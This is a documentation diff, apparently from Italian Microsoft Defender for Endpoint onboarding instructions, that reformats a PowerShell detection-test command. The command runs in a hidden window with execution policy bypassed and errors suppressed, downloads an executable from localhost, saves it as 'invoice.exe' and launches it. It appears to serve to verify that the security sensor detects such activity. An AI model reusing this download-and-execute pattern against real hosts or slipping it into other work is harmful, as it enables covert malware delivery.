@@ -308,7 +308,7 @@ automaticamente
     prompt, copiare ed eseguire il comando seguente. La finestra del
     prompt dei comandi si chiuderà automaticamente.
 
-`powershell.exe -``NoExit`` -``ExecutionPolicy`` Bypass -``WindowStyle`` Hidden $``ErrorActionPreference``= 'silentlycontinue';(New-ObjectSystem.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','C:\test-WDATP-test\invoice.exe');Start-Process 'C:\test-WDATP-test\invoice.exe'`
+`powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-ObjectSystem.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','C:\test-WDATP-test\invoice.exe');Start-Process 'C:\test-WDATP-test\invoice.exe'`
 
 ![Text Description automatically generated](./media/image35.png)
 
